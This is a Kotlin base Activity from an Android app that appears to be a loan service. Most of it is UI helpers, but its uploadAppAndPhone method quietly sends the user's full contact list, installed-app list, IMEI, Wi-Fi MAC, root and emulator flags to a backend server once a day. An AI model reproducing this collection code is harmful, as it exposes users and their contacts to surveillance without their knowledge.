package com.neutron.deloan.base

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Message
import android.view.*
import android.view.animation.AccelerateInterpolator
import android.view.animation.Animation
import android.view.animation.TranslateAnimation
import android.widget.LinearLayout
import android.widget.PopupWindow
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.just.agentweb.AgentWeb
import com.neutron.deloan.NApplication
import com.neutron.deloan.R
import com.neutron.deloan.bean.AppList
import com.neutron.deloan.bean.UploadDeviceInfo
import com.neutron.deloan.main.MainActivity
import com.neutron.deloan.net.RetrofitUtil
import com.neutron.deloan.utils.*
import com.neutron.deloan.view.LoaddingDialog
import com.ronal.crazy.util.DeviceInfoFactory
import kotlinx.android.synthetic.main.toolbar_common.*
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

abstract class IBaseActivity : AppCompatActivity(), IView {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(getLayoutId())
        window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR
        initView()
        AppManager.instance.addActivity(this)

    }

    open fun setStatusBarColor(activity: Activity, statusColor: Int) {
        val decorView = this.window.decorView
        val option = (View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                or View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR)
        decorView.systemUiVisibility = option
        activity.window.statusBarColor = activity.getColor(statusColor)

    }


    open fun reStartAPP() {
        AppManager.instance.clearStack()
        val intent = Intent(this, MainActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
        finish()
    }

    abstract fun getLayoutId(): Int

    abstract fun initView()


    override fun onPause() {

        super.onPause()
    }

    override fun onResume() {
        if (!Utils.checkNet(this)) {
            toast(R.string.not_net)
        }


        super.onResume()
    }


    var loadding: LoaddingDialog? = null

    override fun showLoading() {
        loadding = LoaddingDialog(this)
        if (loadding != null && !loadding!!.isShowing) {
            loadding!!.show()
        }

    }

    override fun hideLoading() {
        if (loadding != null && loadding!!.isShowing) {
            loadding!!.dismiss()
            loadding = null
        }

    }


    open fun initToolbar(title: String, isShowBack: Boolean = false) {
        tv_title.text = title
        if (isShowBack) {
            iv_exit.visibility = View.VISIBLE
        } else {
            iv_exit.visibility = View.GONE
        }
        iv_exit.setOnClickListener {
            finish()
        }
    }


    override fun showError(e: Exception) {
        e.printStackTrace()
        Slog.d("网络访问错误 ${e}")


    }

    private var popupWindow = PopupWindow(
        ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT
    )

    private fun showPopWindow(title: String, message: String, method: () -> Unit) {

        val popupView = LayoutInflater.from(this).inflate(R.layout.layout_popwindow, null)


        val tvMessage = popupView.findViewById<TextView>(R.id.tv_pop_message)
        val tvTitle = popupView.findViewById<TextView>(R.id.tv_pop_title)
        tvTitle.text = title
        tvMessage.text = message

        tvMessage.setOnClickListener {
            method.invoke()
        }

        val btnCancel = popupView.findViewById<TextView>(R.id.tv_pop_cancel)
        val layoutParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        );// 创建参数对象，设置宽和高
        val navHeight = Utils.getNavigationBarHeight(this)
        layoutParams.setMargins(0, 10, 0, navHeight + 10);


        btnCancel.layoutParams = layoutParams
        val lister = View.OnClickListener {
            if (popupWindow.isShowing) {
                popupWindow.dismiss()
            }

        }
        btnCancel.setOnClickListener(lister)
        // 平移动画相对于手机屏幕的底部开始，X轴不变，Y轴从1变0
        val animation = TranslateAnimation(
            Animation.RELATIVE_TO_PARENT, 0F, Animation.RELATIVE_TO_PARENT, 0F,
            Animation.RELATIVE_TO_PARENT, 1F, Animation.RELATIVE_TO_PARENT, 0F
        )
        animation.interpolator = AccelerateInterpolator()
        animation.duration = 200
        popupWindow.contentView = popupView
        popupWindow.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
        popupWindow.width = WindowManager.LayoutParams.MATCH_PARENT
        popupWindow.height = WindowManager.LayoutParams.WRAP_CONTENT
        popupWindow.isOutsideTouchable = true
        popupWindow.isFocusable = true
        popupWindow.isClippingEnabled = false
        if (!popupWindow.isShowing) {
            popupWindow.showAtLocation(
                this.findViewById(R.id.ll_main),
                Gravity.BOTTOM or Gravity.CENTER_HORIZONTAL,
                0,
                20
            )
            popupView.startAnimation(animation)
            changeBackground(0.5F)
        }
        popupWindow.setOnDismissListener {
            changeBackground(1F)
        }

    }
    fun getUserId(): String {
        val id = PreferencesHelper.getUserID()
        if (id.isNullOrEmpty()) {
            Slog.d("当前ID为空")
        }

        return id
    }


    fun getUserPhone(): String {
        val phone = PreferencesHelper.getPhone()
        if (phone.isNullOrEmpty()) {
            Slog.d("当前Phone为空")
        }

        return phone
    }
    private fun changeBackground(alpha: Float) {
        val lp: WindowManager.LayoutParams = window.attributes
        lp.alpha = alpha
        window.attributes = lp
    }

    fun uploadAppAndPhone(context: Context) {
        val phone = getUserPhone()
        val userID =  getUserId()

        if (System.currentTimeMillis() - PreferencesHelper.getUploadTime() <= 86400000) {
            Slog.d("今天已经上传过个人信息")
            return
        }
        PreferencesHelper.setUploadTime(System.currentTimeMillis())
        Slog.d("上传个人信息")
        GlobalScope.launch {
            val contacts = DataBaseHelper.getAllContacts(context)
            var hashMap = HashMap<String, Any>()
            hashMap["user_id"] =userID
            hashMap["self_mobile"] = phone
            hashMap["account_id"] = phone
            hashMap["uuid"] = DeviceFactory.getInstance().getUUID() ?: ""
            hashMap["record"] = contacts.toArray()
            RetrofitUtil.service.uploadPhone(Utils.createBody(Utils.createCommonParams(hashMap)))
            val apps = DataBaseHelper.getAppList(NApplication.sContext)
            val deviceInfoFactory: DeviceInfoFactory = DeviceInfoFactory.getInstance()
            val uploadDeviceRecord: MutableList<UploadDeviceInfo> = mutableListOf()
            val appRecord: MutableList<AppList> = mutableListOf()
            apps.forEach {
                appRecord.add(
                    AppList(
                        it.firstTime,
                        it.lastTime,
                        it.name,
                        it.packageName,
                        it.versionCode,
                        it.systemApp
                    )
                )
            }

            uploadDeviceRecord.add(
                UploadDeviceInfo(
                    getUserId(),
                    deviceInfoFactory.getIMEI(),
                    deviceInfoFactory.getBrands(),
//                    user?.phonepre + "" + user?.phone,
                    deviceInfoFactory.getMobil(),
                    getUserPhone(),
                    deviceInfoFactory.getCpuModel(),
                    deviceInfoFactory.getCpuCores(),
                    deviceInfoFactory.getRAMInfo(),
                    deviceInfoFactory.getRomInfo(),
                    deviceInfoFactory.getResolution(),
                    deviceInfoFactory.openAppBatteryLevel?.toString(),
                    deviceInfoFactory.openAppTime,
                    deviceInfoFactory.getSystemVersion(),
                    deviceInfoFactory.getBatteryLevel().toString(),
                    deviceInfoFactory.getCurrentTime(),
                    "0",
                    deviceInfoFactory.whetherScreenshot.toString(),
                    deviceInfoFactory.isSuEnableRoot().toString(),
                    deviceInfoFactory.getWifiName(),
                    deviceInfoFactory.getWifiMac(),
                    deviceInfoFactory.getWifiState(),
                    deviceInfoFactory.virtualMachine.toString(),
                    "0",
                    appRecord
                )
            )
            val eprePhone=PreferencesHelper.getPhoneEPRE()+getUserPhone()

            var hashMap1 = HashMap<String, Any>()
            hashMap1["account_id"] = eprePhone
            hashMap1["uuid"] = deviceInfoFactory.getUUID().toString()
            hashMap1["imei"] = deviceInfoFactory.getIMEI().toString()
            hashMap1["pkg_name"] = NApplication.sContext.packageName
            hashMap1["record"] = uploadDeviceRecord
            hashMap1["user_id"] = getUserId()
            hashMap1["self_mobile"] = eprePhone
            RetrofitUtil.service.uploadApp(Utils.createBody(Utils.createCommonParams(hashMap1)))

        }


    }

}